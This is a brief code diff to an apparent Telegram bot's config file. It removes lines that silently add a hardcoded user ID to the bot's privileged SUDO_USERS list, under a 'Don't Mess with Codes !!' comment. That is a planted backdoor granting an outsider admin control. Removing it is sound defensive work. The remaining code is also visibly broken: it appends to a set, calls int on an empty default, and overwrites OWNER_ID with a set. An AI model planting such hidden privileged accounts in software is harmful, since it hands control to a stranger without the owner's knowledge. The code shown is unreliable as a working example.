@@ -369,15 +369,7 @@ RAID = [
 SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "").split())
 
 
-if 5391883908 not in SUDO_USERS:
-    SUDO_USERS.append(5391883908)
-
-OWNER_ID = int(os.environ.get("OWNER_ID", None))
-
-# Don't Mess with Codes !! 
-SUDO_USERS.append(OWNER_ID)
-
-SUDO_USERS.append(5391883908)
+OWNER_ID = int(os.environ.get("OWNER_ID", ""))
 
 OWNER_ID = SUDO_USERS
 
